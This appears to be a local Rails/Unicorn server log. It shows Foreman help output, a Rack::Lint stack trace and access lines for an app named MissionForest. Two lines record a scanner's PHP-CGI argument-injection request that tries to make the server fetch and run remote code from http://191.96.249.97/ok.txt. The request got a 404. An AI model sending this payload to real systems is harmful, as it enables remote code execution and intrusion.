Commands:
  foreman check                   # Validate your application's Procfile
  foreman export FORMAT LOCATION  # Export the application to another process...
  foreman help [COMMAND]          # Describe available commands or one specif...
  foreman run COMMAND [ARGS...]   # Run a command using your application's en...
  foreman start [PROCESS]         # Start the application (or a specific PROC...
  foreman version                 # Display Foreman gem version

Options:
  -f, [--procfile=PROCFILE]  # Default: Procfile
  -d, [--root=ROOT]          # Default: Procfile directory

Commands:
  foreman check                   # Validate your application's Procfile
  foreman export FORMAT LOCATION  # Export the application to another process...
  foreman help [COMMAND]          # Describe available commands or one specif...
  foreman run COMMAND [ARGS...]   # Run a command using your application's en...
  foreman start [PROCESS]         # Start the application (or a specific PROC...
  foreman version                 # Display Foreman gem version

Options:
  -f, [--procfile=PROCFILE]  # Default: Procfile
  -d, [--root=ROOT]          # Default: Procfile directory

15:52:33 web.1  | started with pid 2688
03:42:27 web.1  | E, [2017-04-20T03:42:27.916984 #14819] ERROR -- : app error: Response body was given for HEAD request, but should be empty (Rack::Lint::LintError)
03:42:27 web.1  | E, [2017-04-20T03:42:27.917053 #14819] ERROR -- : /home/m-watanabe/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/rack-1.6.5/lib/rack/lint.rb:20:in `assert'
03:42:27 web.1  | E, [2017-04-20T03:42:27.917089 #14819] ERROR -- : /home/m-watanabe/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/rack-1.6.5/lib/rack/lint.rb:688:in `verify_content_length'
03:42:27 web.1  | E, [2017-04-20T03:42:27.917111 #14819] ERROR -- : /home/m-watanabe/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/rack-1.6.5/lib/rack/lint.rb:716:in `each'
03:42:27 web.1  | E, [2017-04-20T03:42:27.917130 #14819] ERROR -- : /home/m-watanabe/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/rack-1.6.5/lib/rack/body_proxy.rb:31:in `each'
03:42:27 web.1  | E, [2017-04-20T03:42:27.917149 #14819] ERROR -- : /home/m-watanabe/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/unicorn-4.9.0/lib/unicorn/http_response.rb:60:in `http_response_write'
03:42:27 web.1  | E, [2017-04-20T03:42:27.917182 #14819] ERROR -- : /home/m-watanabe/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/unicorn-4.9.0/lib/unicorn/http_server.rb:590:in `process_client'
03:42:27 web.1  | E, [2017-04-20T03:42:27.917213 #14819] ERROR -- : /home/m-watanabe/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/unicorn-4.9.0/lib/unicorn/http_server.rb:674:in `worker_loop'
03:42:27 web.1  | E, [2017-04-20T03:42:27.917233 #14819] ERROR -- : /home/m-watanabe/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/unicorn-4.9.0/lib/unicorn/http_server.rb:529:in `spawn_missing_workers'
03:42:27 web.1  | E, [2017-04-20T03:42:27.917250 #14819] ERROR -- : /home/m-watanabe/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/unicorn-4.9.0/lib/unicorn/http_server.rb:140:in `start'
03:42:27 web.1  | E, [2017-04-20T03:42:27.917268 #14819] ERROR -- : /home/m-watanabe/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/unicorn-4.9.0/bin/unicorn:126:in `<top (required)>'
03:42:27 web.1  | E, [2017-04-20T03:42:27.917287 #14819] ERROR -- : /home/m-watanabe/.rbenv/versions/2.3.1/bin/unicorn:23:in `load'
03:42:27 web.1  | E, [2017-04-20T03:42:27.917304 #14819] ERROR -- : /home/m-watanabe/.rbenv/versions/2.3.1/bin/unicorn:23:in `<top (required)>'
03:42:27 web.1  | E, [2017-04-20T03:42:27.917326 #14819] ERROR -- : /home/m-watanabe/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/bundler-1.14.6/lib/bundler/cli/exec.rb:74:in `load'
03:42:27 web.1  | E, [2017-04-20T03:42:27.917344 #14819] ERROR -- : /home/m-watanabe/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/bundler-1.14.6/lib/bundler/cli/exec.rb:74:in `kernel_load'
03:42:27 web.1  | E, [2017-04-20T03:42:27.917362 #14819] ERROR -- : /home/m-watanabe/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/bundler-1.14.6/lib/bundler/cli/exec.rb:27:in `run'
03:42:27 web.1  | E, [2017-04-20T03:42:27.917379 #14819] ERROR -- : /home/m-watanabe/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/bundler-1.14.6/lib/bundler/cli.rb:335:in `exec'
03:42:27 web.1  | E, [2017-04-20T03:42:27.917397 #14819] ERROR -- : /home/m-watanabe/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/bundler-1.14.6/lib/bundler/vendor/thor/lib/thor/command.rb:27:in `run'
03:42:27 web.1  | E, [2017-04-20T03:42:27.917414 #14819] ERROR -- : /home/m-watanabe/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/bundler-1.14.6/lib/bundler/vendor/thor/lib/thor/invocation.rb:126:in `invoke_command'
03:42:27 web.1  | E, [2017-04-20T03:42:27.917432 #14819] ERROR -- : /home/m-watanabe/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/bundler-1.14.6/lib/bundler/vendor/thor/lib/thor.rb:359:in `dispatch'
03:42:27 web.1  | E, [2017-04-20T03:42:27.917449 #14819] ERROR -- : /home/m-watanabe/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/bundler-1.14.6/lib/bundler/cli.rb:20:in `dispatch'
03:42:27 web.1  | E, [2017-04-20T03:42:27.917467 #14819] ERROR -- : /home/m-watanabe/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/bundler-1.14.6/lib/bundler/vendor/thor/lib/thor/base.rb:440:in `start'
03:42:27 web.1  | E, [2017-04-20T03:42:27.917484 #14819] ERROR -- : /home/m-watanabe/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/bundler-1.14.6/lib/bundler/cli.rb:11:in `start'
03:42:27 web.1  | E, [2017-04-20T03:42:27.917504 #14819] ERROR -- : /home/m-watanabe/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/bundler-1.14.6/exe/bundle:32:in `block in <top (required)>'
03:42:27 web.1  | E, [2017-04-20T03:42:27.917522 #14819] ERROR -- : /home/m-watanabe/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/bundler-1.14.6/lib/bundler/friendly_errors.rb:121:in `with_friendly_errors'
03:42:27 web.1  | E, [2017-04-20T03:42:27.917540 #14819] ERROR -- : /home/m-watanabe/.rbenv/versions/2.3.1/lib/ruby/gems/2.3.0/gems/bundler-1.14.6/exe/bundle:24:in `<top (required)>'
03:42:27 web.1  | E, [2017-04-20T03:42:27.917557 #14819] ERROR -- : /home/m-watanabe/.rbenv/versions/2.3.1/bin/bundle:23:in `load'
03:42:27 web.1  | E, [2017-04-20T03:42:27.917575 #14819] ERROR -- : /home/m-watanabe/.rbenv/versions/2.3.1/bin/bundle:23:in `<main>'
04:30:28 web.1  | 185.110.132.232 - - [20/Apr/2017:04:30:28 +0900] "GET / HTTP/1.0" 404 - 0.0011
04:31:52 web.1  | 191.96.249.97 - - [20/Apr/2017:04:31:52 +0900] "GET /cgi-bin/php?-d+allow_url_include%3Don+-d+safe_mode%3Doff+-d+suhosin.simulation%3Don+-d+max_execution_time%3D0+-d+disable_functions%3D""+-d+open_basedir%3Dnone+-d+auto_prepend_file%3Dhttp://191.96.249.97/ok.txt+-d+cgi.force_redirect%3D0+-d+cgi.redirect_status_env%3D0+-n HTTP/1.0" 404 - 0.0010
09:32:27 web.1  | 191.96.249.97 - - [20/Apr/2017:09:32:27 +0900] "GET /cgi-bin/php?-d+allow_url_include%3Don+-d+safe_mode%3Doff+-d+suhosin.simulation%3Don+-d+max_execution_time%3D0+-d+disable_functions%3D""+-d+open_basedir%3Dnone+-d+auto_prepend_file%3Dhttp://191.96.249.97/ok.txt+-d+cgi.force_redirect%3D0+-d+cgi.redirect_status_env%3D0+-n HTTP/1.0" 404 - 0.0011
12:13:51 web.1  | 133.68.80.216 - - [20/Apr/2017:12:13:51 +0900] "GET /MissionForest/ HTTP/1.0" 200 - 0.0187
12:13:51 web.1  | 133.68.80.216 - - [20/Apr/2017:12:13:51 +0900] "GET /assets/components.self-d8e9eb718fdfda2b8f022012a0841bd1cea28a3976e741a99e9e9aa468f0fc1a.css?body=1 HTTP/1.0" 404 - 0.0004
12:13:51 web.1  | 133.68.80.216 - - [20/Apr/2017:12:13:51 +0900] "GET /assets/jquery.orgchart.self-98e19eeb407c4bce84a72a5f48a38cfa66bff378d3d05f6957f7091d2b51060c.css?body=1 HTTP/1.0" 404 - 0.0004
12:13:51 web.1  | 133.68.80.216 - - [20/Apr/2017:12:13:51 +0900] "GET /assets/templates/footer.self-23a32d3fc953532370e1b3a252c1c9510bbb2b15120a1cc4fbf4502b4a61d8ea.css?body=1 HTTP/1.0" 404 - 0.0004
12:13:51 web.1  | 133.68.80.216 - - [20/Apr/2017:12:13:51 +0900] "GET /assets/missions/bootstrap-treeview.min.self-5688d85b67135a305d05a581d504fd93a1ae19631156e7ec41561df4d254d417.css?body=1 HTTP/1.0" 404 - 0.0004
12:13:51 web.1  | 133.68.80.216 - - [20/Apr/2017:12:13:51 +0900] "GET /assets/application.self-d9129afc0885819ff1163c2ff7e653b81ac7a75ab279d6fc7e54b5196c09f9f1.css?body=1 HTTP/1.0" 404 - 0.0005
12:13:51 web.1  | 133.68.80.216 - - [20/Apr/2017:12:13:51 +0900] "GET /assets/bootstrap-datetimepicker.self-bff54061185ae9d56e1f0b953c75a099cb65f60718e7e2f0be322be085738188.css?body=1 HTTP/1.0" 404 - 0.0004
12:13:51 web.1  | 133.68.80.216 - - [20/Apr/2017:12:13:51 +0900] "GET /assets/jquery_ujs.self-784a997f6726036b1993eb2217c9cb558e1cbb801c6da88105588c56f13b466a.js?body=1 HTTP/1.0" 404 - 0.0004
12:13:51 web.1  | 133.68.80.216 - - [20/Apr/2017:12:13:51 +0900] "GET /assets/moment.self-0da3eb4ebf8fb8c3113d89afb90e5b7a87760d21b5b39a405a51fe05c8e40fd8.js?body=1 HTTP/1.0" 404 - 0.0006
12:13:51 web.1  | 133.68.80.216 - - [20/Apr/2017:12:13:51 +0900] "GET /assets/jquery.orgchart.self-1063ced77264c64d71a0614bdd084c911f23ef9910ed184b5948d5d8870b39b8.js?body=1 HTTP/1.0" 404 - 0.0005
12:13:51 web.1  | 133.68.80.216 - - [20/Apr/2017:12:13:51 +0900] "GET /assets/application.self-a3ddd37d29af90375f542ed461f430fbafa4a64d8d8eeb6ad30c3d1ff055eb88.js?body=1 HTTP/1.0" 404 - 0.0006
12:13:51 web.1  | 133.68.80.216 - - [20/Apr/2017:12:13:51 +0900] "GET /assets/html2canvas.min.self-07e1b6cfcbc341ebb82cc3d9a97ef6df13d8d3f391c34da14bf71cf359b03379.js?body=1 HTTP/1.0" 404 - 0.0005
12:13:51 web.1  | 133.68.80.216 - - [20/Apr/2017:12:13:51 +0900] "GET /assets/bootstrap-datetimepicker.self-8b304d8493b536f56ff5f3a0cba6238693fb968d72400f3f794b7196c9f5a47f.js?body=1 HTTP/1.0" 404 - 0.0007
12:13:52 web.1  | 133.68.80.216 - - [20/Apr/2017:12:13:52 +0900] "GET /assets/jquery_ujs.self-784a997f6726036b1993eb2217c9cb558e1cbb801c6da88105588c56f13b466a.js?body=1 HTTP/1.0" 404 - 0.0011
12:13:52 web.1  | 133.68.80.216 - - [20/Apr/2017:12:13:52 +0900] "GET /assets/moment.self-0da3eb4ebf8fb8c3113d89afb90e5b7a87760d21b5b39a405a51fe05c8e40fd8.js?body=1 HTTP/1.0" 404 - 0.0010
12:13:52 web.1  | 133.68.80.216 - - [20/Apr/2017:12:13:52 +0900] "GET /assets/bootstrap-datetimepicker.self-8b304d8493b536f56ff5f3a0cba6238693fb968d72400f3f794b7196c9f5a47f.js?body=1 HTTP/1.0" 404 - 0.0012
12:13:52 web.1  | 133.68.80.216 - - [20/Apr/2017:12:13:52 +0900] "GET /assets/html2canvas.min.self-07e1b6cfcbc341ebb82cc3d9a97ef6df13d8d3f391c34da14bf71cf359b03379.js?body=1 HTTP/1.0" 404 - 0.0010
12:13:52 web.1  | 133.68.80.216 - - [20/Apr/2017:12:13:52 +0900] "GET /assets/jquery.orgchart.self-1063ced77264c64d71a0614bdd084c911f23ef9910ed184b5948d5d8870b39b8.js?body=1 HTTP/1.0" 404 - 0.0010
12:13:52 web.1  | 133.68.80.216 - - [20/Apr/2017:12:13:52 +0900] "GET /assets/application.self-a3ddd37d29af90375f542ed461f430fbafa4a64d8d8eeb6ad30c3d1ff055eb88.js?body=1 HTTP/1.0" 404 - 0.0010
12:13:52 web.1  | 133.68.80.216 - - [20/Apr/2017:12:13:52 +0900] "GET /favicon.ico HTTP/1.0" 404 - 0.0012
12:13:54 web.1  | 133.68.80.216 - - [20/Apr/2017:12:13:54 +0900] "GET /MissionForest/users/sign_in HTTP/1.0" 200 - 0.0459
12:13:54 web.1  | 133.68.80.216 - - [20/Apr/2017:12:13:54 +0900] "GET /assets/components.self-d8e9eb718fdfda2b8f022012a0841bd1cea28a3976e741a99e9e9aa468f0fc1a.css?body=1 HTTP/1.0" 404 - 0.0004
12:13:54 web.1  | 133.68.80.216 - - [20/Apr/2017:12:13:54 +0900] "GET /assets/missions/bootstrap-treeview.min.self-5688d85b67135a305d05a581d504fd93a1ae19631156e7ec41561df4d254d417.css?body=1 HTTP/1.0" 404 - 0.0004
12:13:54 web.1  | 133.68.80.216 - - [20/Apr/2017:12:13:54 +0900] "GET /assets/application.self-d9129afc0885819ff1163c2ff7e653b81ac7a75ab279d6fc7e54b5196c09f9f1.css?body=1 HTTP/1.0" 404 - 0.0004
12:13:54 web.1  | 133.68.80.216 - - [20/Apr/2017:12:13:54 +0900] "GET /assets/jquery.orgchart.self-98e19eeb407c4bce84a72a5f48a38cfa66bff378d3d05f6957f7091d2b51060c.css?body=1 HTTP/1.0" 404 - 0.0004
12:13:54 web.1  | 133.68.80.216 - - [20/Apr/2017:12:13:54 +0900] "GET /assets/templates/footer.self-23a32d3fc953532370e1b3a252c1c9510bbb2b15120a1cc4fbf4502b4a61d8ea.css?body=1 HTTP/1.0" 404 - 0.0004
12:13:54 web.1  | 133.68.80.216 - - [20/Apr/2017:12:13:54 +0900] "GET /assets/bootstrap-datetimepicker.self-bff54061185ae9d56e1f0b953c75a099cb65f60718e7e2f0be322be085738188.css?body=1 HTTP/1.0" 404 - 0.0004
12:13:54 web.1  | 133.68.80.216 - - [20/Apr/2017:12:13:54 +0900] "GET /assets/jquery_ujs.self-784a997f6726036b1993eb2217c9cb558e1cbb801c6da88105588c56f13b466a.js?body=1 HTTP/1.0" 404 - 0.0004
12:13:54 web.1  | 133.68.80.216 - - [20/Apr/2017:12:13:54 +0900] "GET /assets/html2canvas.min.self-07e1b6cfcbc341ebb82cc3d9a97ef6df13d8d3f391c34da14bf71cf359b03379.js?body=1 HTTP/1.0" 404 - 0.0004
12:13:54 web.1  | 133.68.80.216 - - [20/Apr/2017:12:13:54 +0900] "GET /assets/bootstrap-datetimepicker.self-8b304d8493b536f56ff5f3a0cba6238693fb968d72400f3f794b7196c9f5a47f.js?body=1 HTTP/1.0" 404 - 0.0004
12:13:54 web.1  | 133.68.80.216 - - [20/Apr/2017:12:13:54 +0900] "GET /assets/application.self-a3ddd37d29af90375f542ed461f430fbafa4a64d8d8eeb6ad30c3d1ff055eb88.js?body=1 HTTP/1.0" 404 - 0.0004
12:13:54 web.1  | 133.68.80.216 - - [20/Apr/2017:12:13:54 +0900] "GET /assets/jquery.orgchart.self-1063ced77264c64d71a0614bdd084c911f23ef9910ed184b5948d5d8870b39b8.js?body=1 HTTP/1.0" 404 - 0.0004
12:13:54 web.1  | 133.68.80.216 - - [20/Apr/2017:12:13:54 +0900] "GET /assets/moment.self-0da3eb4ebf8fb8c3113d89afb90e5b7a87760d21b5b39a405a51fe05c8e40fd8.js?body=1 HTTP/1.0" 404 - 0.0004
12:13:54 web.1  | 133.68.80.216 - - [20/Apr/2017:12:13:54 +0900] "GET /assets/jquery_ujs.self-784a997f6726036b1993eb2217c9cb558e1cbb801c6da88105588c56f13b466a.js?body=1 HTTP/1.0" 404 - 0.0010
12:13:54 web.1  | 133.68.80.216 - - [20/Apr/2017:12:13:54 +0900] "GET /assets/moment.self-0da3eb4ebf8fb8c3113d89afb90e5b7a87760d21b5b39a405a51fe05c8e40fd8.js?body=1 HTTP/1.0" 404 - 0.0010
12:13:54 web.1  | 133.68.80.216 - - [20/Apr/2017:12:13:54 +0900] "GET /assets/bootstrap-datetimepicker.self-8b304d8493b536f56ff5f3a0cba6238693fb968d72400f3f794b7196c9f5a47f.js?body=1 HTTP/1.0" 404 - 0.0011
12:13:54 web.1  | 133.68.80.216 - - [20/Apr/2017:12:13:54 +0900] "GET /assets/html2canvas.min.self-07e1b6cfcbc341ebb82cc3d9a97ef6df13d8d3f391c34da14bf71cf359b03379.js?body=1 HTTP/1.0" 404 - 0.0010
12:13:54 web.1  | 133.68.80.216 - - [20/Apr/2017:12:13:54 +0900] "GET /assets/jquery.orgchart.self-1063ced77264c64d71a0614bdd084c911f23ef9910ed184b5948d5d8870b39b8.js?body=1 HTTP/1.0" 404 - 0.0010
12:13:54 web.1  | 133.68.80.216 - - [20/Apr/2017:12:13:54 +0900] "GET /assets/application.self-a3ddd37d29af90375f542ed461f430fbafa4a64d8d8eeb6ad30c3d1ff055eb88.js?body=1 HTTP/1.0" 404 - 0.0010
12:14:00 web.1  | 133.68.80.216 - - [20/Apr/2017:12:14:00 +0900] "POST /MissionForest/users/sign_in HTTP/1.0" 200 - 0.1219
12:14:00 web.1  | 133.68.80.216 - - [20/Apr/2017:12:14:00 +0900] "GET /assets/components.self-d8e9eb718fdfda2b8f022012a0841bd1cea28a3976e741a99e9e9aa468f0fc1a.css?body=1 HTTP/1.0" 404 - 0.0003
12:14:00 web.1  | 133.68.80.216 - - [20/Apr/2017:12:14:00 +0900] "GET /assets/jquery.orgchart.self-98e19eeb407c4bce84a72a5f48a38cfa66bff378d3d05f6957f7091d2b51060c.css?body=1 HTTP/1.0" 404 - 0.0003
12:14:00 web.1  | 133.68.80.216 - - [20/Apr/2017:12:14:00 +0900] "GET /assets/templates/footer.self-23a32d3fc953532370e1b3a252c1c9510bbb2b15120a1cc4fbf4502b4a61d8ea.css?body=1 HTTP/1.0" 404 - 0.0003
12:14:00 web.1  | 133.68.80.216 - - [20/Apr/2017:12:14:00 +0900] "GET /assets/missions/bootstrap-treeview.min.self-5688d85b67135a305d05a581d504fd93a1ae19631156e7ec41561df4d254d417.css?body=1 HTTP/1.0" 404 - 0.0003
12:14:00 web.1  | 133.68.80.216 - - [20/Apr/2017:12:14:00 +0900] "GET /assets/application.self-d9129afc0885819ff1163c2ff7e653b81ac7a75ab279d6fc7e54b5196c09f9f1.css?body=1 HTTP/1.0" 404 - 0.0003
12:14:00 web.1  | 133.68.80.216 - - [20/Apr/2017:12:14:00 +0900] "GET /assets/bootstrap-datetimepicker.self-bff54061185ae9d56e1f0b953c75a099cb65f60718e7e2f0be322be085738188.css?body=1 HTTP/1.0" 404 - 0.0003
12:14:00 web.1  | 133.68.80.216 - - [20/Apr/2017:12:14:00 +0900] "GET /assets/jquery_ujs.self-784a997f6726036b1993eb2217c9cb558e1cbb801c6da88105588c56f13b466a.js?body=1 HTTP/1.0" 404 - 0.0003
12:14:00 web.1  | 133.68.80.216 - - [20/Apr/2017:12:14:00 +0900] "GET /assets/bootstrap-datetimepicker.self-8b304d8493b536f56ff5f3a0cba6238693fb968d72400f3f794b7196c9f5a47f.js?body=1 HTTP/1.0" 404 - 0.0003
12:14:00 web.1  | 133.68.80.216 - - [20/Apr/2017:12:14:00 +0900] "GET /assets/moment.self-0da3eb4ebf8fb8c3113d89afb90e5b7a87760d21b5b39a405a51fe05c8e40fd8.js?body=1 HTTP/1.0" 404 - 0.0004
12:14:00 web.1  | 133.68.80.216 - - [20/Apr/2017:12:14:00 +0900] "GET /assets/html2canvas.min.self-07e1b6cfcbc341ebb82cc3d9a97ef6df13d8d3f391c34da14bf71cf359b03379.js?body=1 HTTP/1.0" 404 - 0.0003
12:14:00 web.1  | 133.68.80.216 - - [20/Apr/2017:12:14:00 +0900] "GET /assets/jquery.orgchart.self-1063ced77264c64d71a0614bdd084c911f23ef9910ed184b5948d5d8870b39b8.js?body=1 HTTP/1.0" 404 - 0.0004
12:14:00 web.1  | 133.68.80.216 - - [20/Apr/2017:12:14:00 +0900] "GET /assets/application.self-a3ddd37d29af90375f542ed461f430fbafa4a64d8d8eeb6ad30c3d1ff055eb88.js?body=1 HTTP/1.0" 404 - 0.0010
12:14:00 web.1  | 133.68.80.216 - - [20/Apr/2017:12:14:00 +0900] "GET /assets/jquery_ujs.self-784a997f6726036b1993eb2217c9cb558e1cbb801c6da88105588c56f13b466a.js?body=1 HTTP/1.0" 404 - 0.0011
12:14:00 web.1  | 133.68.80.216 - - [20/Apr/2017:12:14:00 +0900] "GET /assets/moment.self-0da3eb4ebf8fb8c3113d89afb90e5b7a87760d21b5b39a405a51fe05c8e40fd8.js?body=1 HTTP/1.0" 404 - 0.0010
12:14:00 web.1  | 133.68.80.216 - - [20/Apr/2017:12:14:00 +0900] "GET /assets/bootstrap-datetimepicker.self-8b304d8493b536f56ff5f3a0cba6238693fb968d72400f3f794b7196c9f5a47f.js?body=1 HTTP/1.0" 404 - 0.0011
12:14:00 web.1  | 133.68.80.216 - - [20/Apr/2017:12:14:00 +0900] "GET /assets/html2canvas.min.self-07e1b6cfcbc341ebb82cc3d9a97ef6df13d8d3f391c34da14bf71cf359b03379.js?body=1 HTTP/1.0" 404 - 0.0010
12:14:00 web.1  | 133.68.80.216 - - [20/Apr/2017:12:14:00 +0900] "GET /assets/jquery.orgchart.self-1063ced77264c64d71a0614bdd084c911f23ef9910ed184b5948d5d8870b39b8.js?body=1 HTTP/1.0" 404 - 0.0010
12:14:00 web.1  | 133.68.80.216 - - [20/Apr/2017:12:14:00 +0900] "GET /assets/application.self-a3ddd37d29af90375f542ed461f430fbafa4a64d8d8eeb6ad30c3d1ff055eb88.js?body=1 HTTP/1.0" 404 - 0.0010
12:14:11 web.1  | 133.68.80.216 - - [20/Apr/2017:12:14:11 +0900] "POST /MissionForest/users/sign_in HTTP/1.0" 200 - 0.1201
12:14:11 web.1  | 133.68.80.216 - - [20/Apr/2017:12:14:11 +0900] "GET /assets/components.self-d8e9eb718fdfda2b8f022012a0841bd1cea28a3976e741a99e9e9aa468f0fc1a.css?body=1 HTTP/1.0" 404 - 0.0003
12:14:11 web.1  | 133.68.80.216 - - [20/Apr/2017:12:14:11 +0900] "GET /assets/jquery.orgchart.self-98e19eeb407c4bce84a72a5f48a38cfa66bff378d3d05f6957f7091d2b51060c.css?body=1 HTTP/1.0" 404 - 0.0004
12:14:11 web.1  | 133.68.80.216 - - [20/Apr/2017:12:14:11 +0900] "GET /assets/missions/bootstrap-treeview.min.self-5688d85b67135a305d05a581d504fd93a1ae19631156e7ec41561df4d254d417.css?body=1 HTTP/1.0" 404 - 0.0004
12:14:11 web.1  | 133.68.80.216 - - [20/Apr/2017:12:14:11 +0900] "GET /assets/templates/footer.self-23a32d3fc953532370e1b3a252c1c9510bbb2b15120a1cc4fbf4502b4a61d8ea.css?body=1 HTTP/1.0" 404 - 0.0004
12:14:11 web.1  | 133.68.80.216 - - [20/Apr/2017:12:14:11 +0900] "GET /assets/application.self-d9129afc0885819ff1163c2ff7e653b81ac7a75ab279d6fc7e54b5196c09f9f1.css?body=1 HTTP/1.0" 404 - 0.0003
12:14:11 web.1  | 133.68.80.216 - - [20/Apr/2017:12:14:11 +0900] "GET /assets/jquery_ujs.self-784a997f6726036b1993eb2217c9cb558e1cbb801c6da88105588c56f13b466a.js?body=1 HTTP/1.0" 404 - 0.0004
12:14:11 web.1  | 133.68.80.216 - - [20/Apr/2017:12:14:11 +0900] "GET /assets/bootstrap-datetimepicker.self-bff54061185ae9d56e1f0b953c75a099cb65f60718e7e2f0be322be085738188.css?body=1 HTTP/1.0" 404 - 0.0004
12:14:11 web.1  | 133.68.80.216 - - [20/Apr/2017:12:14:11 +0900] "GET /assets/moment.self-0da3eb4ebf8fb8c3113d89afb90e5b7a87760d21b5b39a405a51fe05c8e40fd8.js?body=1 HTTP/1.0" 404 - 0.0004
12:14:11 web.1  | 133.68.80.216 - - [20/Apr/2017:12:14:11 +0900] "GET /assets/bootstrap-datetimepicker.self-8b304d8493b536f56ff5f3a0cba6238693fb968d72400f3f794b7196c9f5a47f.js?body=1 HTTP/1.0" 404 - 0.0004
12:14:11 web.1  | 133.68.80.216 - - [20/Apr/2017:12:14:11 +0900] "GET /assets/jquery.orgchart.self-1063ced77264c64d71a0614bdd084c911f23ef9910ed184b5948d5d8870b39b8.js?body=1 HTTP/1.0" 404 - 0.0005
12:14:11 web.1  | 133.68.80.216 - - [20/Apr/2017:12:14:11 +0900] "GET /assets/html2canvas.min.self-07e1b6cfcbc341ebb82cc3d9a97ef6df13d8d3f391c34da14bf71cf359b03379.js?body=1 HTTP/1.0" 404 - 0.0004
12:14:11 web.1  | 133.68.80.216 - - [20/Apr/2017:12:14:11 +0900] "GET /assets/application.self-a3ddd37d29af90375f542ed461f430fbafa4a64d8d8eeb6ad30c3d1ff055eb88.js?body=1 HTTP/1.0" 404 - 0.0010
12:14:11 web.1  | 133.68.80.216 - - [20/Apr/2017:12:14:11 +0900] "GET /assets/jquery_ujs.self-784a997f6726036b1993eb2217c9cb558e1cbb801c6da88105588c56f13b466a.js?body=1 HTTP/1.0" 404 - 0.0011
12:14:11 web.1  | 133.68.80.216 - - [20/Apr/2017:12:14:11 +0900] "GET /assets/moment.self-0da3eb4ebf8fb8c3113d89afb90e5b7a87760d21b5b39a405a51fe05c8e40fd8.js?body=1 HTTP/1.0" 404 - 0.0010
12:14:11 web.1  | 133.68.80.216 - - [20/Apr/2017:12:14:11 +0900] "GET /assets/bootstrap-datetimepicker.self-8b304d8493b536f56ff5f3a0cba6238693fb968d72400f3f794b7196c9f5a47f.js?body=1 HTTP/1.0" 404 - 0.0010
12:14:11 web.1  | 133.68.80.216 - - [20/Apr/2017:12:14:11 +0900] "GET /assets/html2canvas.min.self-07e1b6cfcbc341ebb82cc3d9a97ef6df13d8d3f391c34da14bf71cf359b03379.js?body=1 HTTP/1.0" 404 - 0.0010
12:14:11 web.1  | 133.68.80.216 - - [20/Apr/2017:12:14:11 +0900] "GET /assets/jquery.orgchart.self-1063ced77264c64d71a0614bdd084c911f23ef9910ed184b5948d5d8870b39b8.js?body=1 HTTP/1.0" 404 - 0.0010
12:14:11 web.1  | 133.68.80.216 - - [20/Apr/2017:12:14:11 +0900] "GET /assets/application.self-a3ddd37d29af90375f542ed461f430fbafa4a64d8d8eeb6ad30c3d1ff055eb88.js?body=1 HTTP/1.0" 404 - 0.0010
12:14:12 web.1  | 133.68.80.216 - - [20/Apr/2017:12:14:12 +0900] "GET /MissionForest/users/sign_up HTTP/1.0" 200 - 0.0398
12:14:12 web.1  | 133.68.80.216 - - [20/Apr/2017:12:14:12 +0900] "GET /assets/components.self-d8e9eb718fdfda2b8f022012a0841bd1cea28a3976e741a99e9e9aa468f0fc1a.css?body=1 HTTP/1.0" 404 - 0.0004
